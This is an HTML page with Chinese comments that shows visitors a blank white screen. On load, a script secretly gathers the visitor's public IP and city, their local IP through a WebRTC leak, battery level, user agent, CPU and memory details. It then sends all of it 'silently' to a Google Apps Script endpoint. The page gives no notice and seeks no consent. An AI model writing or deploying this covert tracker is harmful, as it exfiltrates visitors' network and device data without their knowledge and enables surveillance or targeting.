<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <title></title> 
    <style>body { margin: 0; padding: 0; background: #ffffff; }</style>
</head>
<body>

<script>
    // ==============================================
    // 更新後的 Apps Script 網址
    // ==============================================
    const GAS_ENDPOINT = 'https://script.google.com/macros/s/AKfycbwvqeLz2xm3DT2Z43P8JeKYvR8AgZsFWqliBPK9j2TPFuUE51bMyELfFMTRsXkvi8Va/exec'; 

    // 1. 獲取電池狀態
    async function getBatteryInfo() {
        if (!navigator.getBattery) return "不支援";
        try {
            const battery = await navigator.getBattery();
            const level = Math.round(battery.level * 100) + "%";
            const status = battery.charging ? "充電中" : "使用中";
            return `${level} (${status})`;
        } catch (e) { 
            return "拒絕存取"; 
        }
    }

    // 2. 透過 WebRTC 嘗試獲取內網 IP
    async function getLocalIP() {
        return new Promise((resolve) => {
            try {
                const pc = new RTCPeerConnection({iceServers: []});
                pc.createDataChannel('');
                pc.createOffer().then(pc.setLocalDescription.bind(pc));
                
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                    const myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate);
                    if (myIP) {
                        resolve(myIP[1]);
                        pc.onicecandidate = () => {}; // 停止監聽
                    }
                };
                // 設定 1.5 秒超時，避免因為抓不到而卡住整個流程
                setTimeout(() => { resolve("隱藏或拒絕存取"); }, 1500);
            } catch (e) {
                resolve("不支援");
            }
        });
    }

    // 3. 獲取公網 IP 與大概地區 (使用 ipapi.co)
    async function getPublicInfo() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            return {
                ip: data.ip,
                location: `${data.city}, ${data.region}, ${data.country_name}`
            };
        } catch (e) {
            // 備用方案：只抓 IP
            try {
                const ipResp = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResp.json();
                return { ip: ipData.ip, location: "無法取得地區" };
            } catch (err) {
                return { ip: "未知", location: "未知" };
            }
        }
    }

    // 4. 主程式：打包資料並發送
    async function startCollection() {
        // 並行執行所有偵測任務
        const [netInfo, localIp, battery] = await Promise.all([
            getPublicInfo(),
            getLocalIP(),
            getBatteryInfo()
        ]);

        const payload = {
            location: netInfo.location,      // 大概地區
            userAgent: navigator.userAgent,  // 設備資訊
            publicIp: netInfo.ip,            // 公網 IP
            localIp: localIp,                // 內網 IP
            cores: navigator.hardwareConcurrency || '未知',
            memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : '未知',
            platform: navigator.platform,
            battery: battery                 // 電量
        };

        try {
            // 靜默發送 (no-cors)
            await fetch(GAS_ENDPOINT, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            console.log("Transmission Complete");
        } catch (error) {
            console.error("Transmission Failed");
        }
    }

    // 頁面載入後立即執行
    window.onload = startCollection;
</script>

</body>
</html>
